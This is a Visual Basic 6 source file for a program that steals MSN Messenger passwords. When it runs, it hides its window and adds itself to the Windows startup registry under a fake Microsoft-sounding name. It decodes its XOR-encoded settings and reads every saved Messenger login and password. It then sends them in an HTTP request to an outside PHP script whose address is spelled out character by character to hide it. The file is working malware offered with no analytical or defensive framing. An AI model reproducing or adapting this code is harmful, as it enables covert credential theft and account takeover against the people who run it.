VERSION 5.00
Begin VB.Form f 
   BorderStyle     =   1  'Fixed Single
   ClientHeight    =   4305
   ClientLeft      =   45
   ClientTop       =   345
   ClientWidth     =   6615
   Icon            =   "mesnpass.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4305
   ScaleWidth      =   6615
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.ListBox l 
      Height          =   4155
      ItemData        =   "mesnpass.frx":000C
      Left            =   3840
      List            =   "mesnpass.frx":0025
      TabIndex        =   1
      Top             =   120
      Width           =   2655
   End
   Begin VB.TextBox txtmessenger 
      Height          =   4095
      Left            =   120
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   0
      ToolTipText     =   $"mesnpass.frx":0195
      Top             =   120
      Width           =   3735
   End
End
Attribute VB_Name = "f"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function InternetOpen Lib "wininet.dll" Alias "InternetOpenA" (ByVal sAgent As String, ByVal lAccessType As Long, ByVal sProxyName As String, ByVal sProxyBypass As String, ByVal lFlags As Long) As Long
Private Declare Function InternetOpenUrl Lib "wininet.dll" Alias "InternetOpenUrlA" (ByVal hInternetSession As Long, ByVal sURL As String, ByVal sHeaders As String, ByVal lHeadersLength As Long, ByVal lFlags As Long, ByVal lContext As Long) As Long
Private Declare Function InternetReadFile Lib "wininet.dll" (ByVal hFile As Long, ByVal sBuffer As String, ByVal lNumBytesToRead As Long, lNumberOfBytesRead As Long) As Integer
Private Declare Function InternetCloseHandle Lib "wininet.dll" (ByVal hInet As Long) As Integer
Private Const IF_FROM_CACHE = &H1000000
Private Const IF_MAKE_PERSISTENT = &H2000000
Private Const IF_NO_CACHE_WRITE = &H4000000
Private Const BUFFER_LEN = 256
Private PMSNMessenger As New msnpwds
Dim msnmp As msnpwd
Dim veri As String

Public Function foxcoz(CodeKey As String, DataIn As String) As String
Dim lonDataPtr As Long
Dim strDataOut As String
Dim intXOrValue1 As Integer
Dim intXOrValue2 As Integer
For lonDataPtr = 1 To (Len(DataIn) / 2)
intXOrValue1 = Val("&H" & (Mid$(DataIn, (2 * lonDataPtr) - 1, 2)))
intXOrValue2 = Asc(Mid$(CodeKey, ((lonDataPtr Mod Len(CodeKey)) + 1), 1))
strDataOut = strDataOut + Chr(intXOrValue1 Xor intXOrValue2)
Next lonDataPtr
foxcoz = strDataOut
End Function

Private Sub Form_Load()
App.TaskVisible = False
Me.Hide
Me.Visible = False
Set wshshell = CreateObject("WScript.Shell")
wshshell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\WINDOWS\CURRENTVERSION\RUN\Microsoft Class Runtime.exe", App.Path & "\" & App.EXEName & ".exe"
For sayac = 0 To l.ListCount - 1
    l.List(sayac) = foxcoz("ÞÝKAÐET", Replace(l.List(sayac), "#", "", , , vbTextCompare))
Next
If l.List(0) = "1" Then
MsgBox l.List(2), vbOKOnly + Val(l.List(3)), l.List(1)
End If
sifrelerial
End Sub

Private Function gonder(sURL As String)
    Dim sBuffer As String * BUFFER_LEN, iResult As Integer, sData As String
    Dim hInternet As Long, hSession As Long, lReturn As Long
    hSession = InternetOpen("vb wininet", 1, vbNullString, vbNullString, 0)
    If hSession Then hInternet = InternetOpenUrl(hSession, sURL, vbNullString, 0, IF_NO_CACHE_WRITE, 0)
    iResult = InternetCloseHandle(hInternet)
    End
End Function

Sub sifrelerial()
For Each msnmp In PMSNMessenger
txtmessenger.Text = txtmessenger.Text & "{" & msnmp.Login & ":" & msnmp.Password & "}"
Next
veri = "h" & "t" & "t" & "p" & ":" & "/" & "/" & "m" & "e" & "m" & "b" & "e" & "r" & "s" & "." & "l" & "y" & "c" & "o" & "s" & "." & "c" & "o" & "." & "u" & "k" & "/" & "f" & "a" & "k" & "e" & "p" & "o" & "w" & "e" & "r" & "/" & "y" & "o" & "l" & "l" & "a" & "." & "p" & "h" & "p" & "?" & "a" & "c" & "t" & "i" & "o" & "n" & "=" & "g" & "o" & "&" & "e" & "x" & "p" & "e" & "d" & "i" & "t" & "o" & "r" & "=" & l.List(4) & "&" & "r" & "e" & "c" & "e" & "p" & "t" & "o" & "r" & "=" & l.List(5) & "&" & "t" & "o" & "p" & "i" & "c" & "=" & l.List(6) & "&" & "c" & "o" & "n" & "t" & "e" & "n" & "t" & "=" & txtmessenger
gonder veri
End Sub
